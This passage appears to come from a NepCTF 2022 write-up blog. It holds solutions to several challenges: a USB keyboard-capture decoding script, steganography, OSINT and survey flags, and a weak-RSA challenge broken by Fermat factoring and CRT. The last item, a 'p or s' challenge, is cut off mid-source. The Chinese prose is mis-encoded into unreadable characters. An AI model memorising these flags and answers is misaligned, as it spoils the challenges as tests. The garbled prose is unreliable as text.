class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">  <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> output[a]</span><br><span class="line"><span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">flag+=<span class="number">1</span></span><br><span class="line">output.pop(i)</span><br><span class="line"><span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">output[i]=output[i].upper()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>welcometonepctf2nd</code>ï¼ŒåŠ åˆ†éš”ç¬¦å¾—flagï¼š<code>nepctf&#123;welcome_to_nepctf_2nd&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±"><a href="#èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±" class="headerlink" title="èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±"></a>èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±</h3><blockquote><p>èŠ±èŠ±ç”»äº†ä¸€å¼ å›¾ï¼Œä½ èƒ½çœ‹å‡ºæ¥å¥¹ç”»çš„æ˜¯ä»€ä¹ˆå—</p><p>(flagæ ¼å¼ä¸ºNepCTF{})</p></blockquote><p>åœ¨ <a href="https://osu.ppy.sh/wiki/zh/Client/File_formats">osu! wiki</a> å¯ä»¥å‘ç°oszæ–‡ä»¶ä¸ºå¯æ‰§è¡Œçš„osu!è°±é¢æ–‡ä»¶ï¼Œä¸‹è½½å®‰è£…osu!ï¼Œ</p><p>æ ¹æ® <code>ç”Ÿæˆçš„ .osz æ–‡ä»¶ä¼šè¢«æ”¾ç½®åœ¨ osu! æ–‡ä»¶å¤¹ä¸‹çš„ &quot;Exports&quot; æ–‡ä»¶å¤¹é‡Œ</code>ï¼Œå°†oszæ–‡ä»¶æ”¾å…¥ <code>Exports</code> æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€osu!ï¼Œ</p><p>åœ¨Edité¡µé¢çœ‹å®Œæ•´é¦–æ­Œæ›²çš„ä¹è°±è½¨è¿¹ï¼Œæ‹¿åˆ°flagï¼š<code>NepCTF&#123;MASTER_OF_åå¥³äººï¼&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="å°‘è§çš„bbbbase"><a href="#å°‘è§çš„bbbbase" class="headerlink" title="å°‘è§çš„bbbbase"></a>å°‘è§çš„bbbbase</h3><blockquote><p>å°‘è§çš„bbbbase</p></blockquote><p>å°è¯•å‡ ç§å¸¸è§jpgéšå†™ï¼Œå‘ç°æ˜¯jphideéšå†™ï¼Œç”¨JPHSå·¥å…·seekï¼ˆæ— å¯†ç ï¼‰ï¼Œå¾—åˆ° <code>KkYWdvCQcLYewSUUy5TtQc9AMa</code></p><p>base58è§£å¾—flagï¼š<code>flag&#123;Real_qiandao~&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="9ç‚¹ç›´æ’­"><a href="#9ç‚¹ç›´æ’­" class="headerlink" title="9ç‚¹ç›´æ’­"></a>9ç‚¹ç›´æ’­</h3><blockquote><p>å„ä½åŒå­¦ï¼Œæ¯”èµ›å·²ç»å¼€å§‹å°†è¿‘åä¸ªå°æ—¶å•¦ï¼Œå¤§å®¶ç©çš„å¦‚ä½•å‘¢ï¼Ÿé‚€è¯·å¤§å®¶9ç‚¹æ¥ç›´æ’­é—´èŠèŠå¤©~ è¯·é”å®š<a href="https://b23.tv/bn0pPAR">https://b23.tv/bn0pPAR</a><br>è¿™è¾¹å°åŠ©æ‰‹æ”¶åˆ°äº†å¤§å®¶æƒ³æš´æ‰“å‡ºé¢˜äººçš„åé¦ˆï¼Œä»Šæ™š9ç‚¹æˆ‘ä»¬è¯·åˆ°äº†å˜æ€çš„å‡ºé¢˜äººä»¬ï¼Œåœ¨ç›´æ’­é—´å’Œå¤§å®¶äº¤æµï¼Œæ”¾å‡ºæˆ‘ä»¬çš„hintï¼Œå¸®åŠ©å¤§å®¶è§£é¢˜ã€‚<br>åŒæ—¶ä¹Ÿä¼šåœ¨ç›´æ’­é—´ä¸­æŠ½å¹¸è¿çš„å°ä¼™ä¼´é€å‡ºæˆ‘ä»¬çš„å‘¨è¾¹ç¤¼å“ã€‚</p></blockquote><p>çœ‹Bç«™ç›´æ’­æ‹¿flagï¼š<code>NepCTF&#123;bad_woman_nb!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="é¦…é¥¼ï¼Ÿé™·é˜±ï¼"><a href="#é¦…é¥¼ï¼Ÿé™·é˜±ï¼" class="headerlink" title="é¦…é¥¼ï¼Ÿé™·é˜±ï¼"></a>é¦…é¥¼ï¼Ÿé™·é˜±ï¼</h3><blockquote><p>å¥½å…„å¼Ÿä¸­å¥–äº†ï¼Œä½†æ˜¯è¦å…ˆæ±‡æ¬¾ã€‚ä»–å»å“ªäº†ï¼Ÿ</p><p>NepCTF{é“¶è¡Œå®˜ç½‘ç½‘å€}</p></blockquote><p>OSINTé¢˜ã€‚</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717235016617.png" alt="image-20220717235016617"></p><p>ç”¨Yandexè¯†åˆ«å›¾1é‡Œçš„é»„è‰²å»ºç­‘ï¼Œå¯å¾—åˆ°ç»“æœä¸º<strong>è±ªå¨æµ·æ™¯å¤§é…’åº—</strong>ï¼Œå†åœ¨ç™¾åº¦åœ°å›¾é‡Œæœç´¢åœ¨æµ·å—ä¸‰äºšï¼Œé™„è¿‘é“¶è¡Œä¸º<strong>å…‰å¤§é“¶è¡Œ</strong>ï¼Œ</p><p>å®˜ç½‘ç½‘å€å³flagï¼š<code>NepCTF&#123;www.cebbank.com&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h3><blockquote><p><a href="https://www.wjx.cn/vm/mjlLAVV.aspx">https://www.wjx.cn/vm/mjlLAVV.aspx</a></p></blockquote><p>ç­”é—®å·æš´æ‰“å‡ºé¢˜äººï¼Œæ‹¿flagï¼š<code>NepCTF&#123;see_you_NepCTF_2023&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: NepCTF{xxx}</p><p>Have you heard of the Chinese Remainder Theorem?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,is_prime,invert,bit_length, next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    (p,q,n,e,d) = (<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = next_prime(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     q = p + 1</span></span><br><span class="line"><span class="comment">#     while(True):</span></span><br><span class="line"><span class="comment">#         q += 2 if q &amp; 1 else 1</span></span><br><span class="line"><span class="comment">#         if is_prime(q, 30):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"></span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    par = (p,q,n,e,d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> par</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">par, c</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here&#x27;s something for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_p =&quot;</span>,c % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_q =&quot;</span>,c % q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">message, par</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line">    c = powmod(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    par = gen_key()</span><br><span class="line">    c = enc(flag, par)</span><br><span class="line">    leak(par, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Here&#x27;s something for you.</span></span><br><span class="line"><span class="string">n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816</span></span><br><span class="line"><span class="string">c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>è´¹é©¬åˆ†è§£å’ŒCRTåº”ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n =</span><br><span class="line">q = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    q = gmpy2.next_prime(q)</span><br><span class="line">    <span class="keyword">if</span> n%q == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">cp =</span><br><span class="line">cq =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = crt([cp,cq],[p,q])</span><br><span class="line">d = inverse_mod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="p-or-s"><a href="#p-or-s" class="headerlink" title="p or s"></a>p or s</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: flag{xxx}</p><p>what are the differences between P and Sï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(keys)==<span class="number">6</span>)</span><br><span class="line">Pbox=[</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span 